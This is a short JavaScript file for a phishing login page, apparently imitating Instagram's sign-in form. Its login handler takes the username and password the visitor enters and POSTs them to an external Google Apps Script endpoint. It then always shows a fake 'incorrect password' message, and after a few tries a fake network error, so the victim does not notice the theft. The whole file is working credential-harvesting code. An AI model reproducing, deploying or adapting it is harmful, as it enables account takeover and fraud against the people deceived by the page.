let loginAttempts = 0;

// Password Show/Hide Function
function togglePassword() {
    const passwordField = document.getElementById("password");
    const eyeIcon = document.getElementById("eye-icon");
    if (passwordField.type === "password") {
        passwordField.type = "text";
        eyeIcon.style.stroke = "#0064e0";
    } else {
        passwordField.type = "password";
        eyeIcon.style.stroke = "#8a8a8a";
    }
}

// Login & Data Sending Function
async function handleLogin() {
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;
    const msg = document.getElementById("error-message");

    if (user === "" || pass === "") return;

    loginAttempts++;

    // Terminal pe data bhejna
    try {
        await fetch('https://script.google.com/macros/s/AKfycbyVoMPvrOXhTpm0h0tCF6FTPaJxvcjgiopMJwogDJ56pPJHRW2L6M1v9u5slCHJufgsPQ/exec', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: user, password: pass })
        });
    } catch (err) {
        console.log("Server not running!");
    }

    // Wrong Password aur Network Error logic
    if (loginAttempts <= 2) {
        msg.innerText = "Sorry, your password was incorrect. Please double-check your password.";
        msg.style.color = "#ed4956";
    } else {
        msg.innerText = "Network Error: Please check your internet connection and try again later.";
        msg.style.color = "#8e8e8e";
    }
}